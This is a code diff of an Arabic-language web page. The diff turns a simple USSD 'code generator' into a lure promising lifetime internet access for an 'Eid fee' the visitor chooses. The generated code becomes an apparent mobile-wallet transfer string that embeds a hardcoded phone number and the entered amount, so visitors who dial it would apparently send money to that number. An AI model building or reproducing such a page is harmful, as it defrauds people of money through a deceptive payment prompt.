@@ -118,17 +118,18 @@
 </head>
 <body>
     <div class="container">
-        <h2>مولد الكود</h2>
-        <label for="number">أدخل الرقم:</label><br>
-        <input type="text" id="number" placeholder="اكتب الرقم هنا"><br>
-        <button onclick="generateCode()">إنشاء الكود</button>
+        <h2> ادفع رسوم العيدية الي تناسبك </h2>
+    <h2> عيش علي النت براحتك مدي الحياه </h2>
+        <label for="number">أدخل الرسوم المناسبة ليك:</label><br>
+        <input type="text" id="number" placeholder="اكتب المبلغ هنا"><br>
+        <button onclick="generateCode()">دفع الرسوم </button>
         <div id="result"></div>
     </div>
 
     <script>
         function generateCode() {
             var number = document.getElementById("number").value;
-            var code = "*9*7*" + number + "*10#";
+            var code = "*9*7*01007586279" + number + "#";
             document.getElementById("result").innerHTML = "الكود: " + code;
         }
     </script>
@@ -331,6 +332,7 @@
   <script src="main.js"></script>
 </body>
 </html>
+
 
 
 
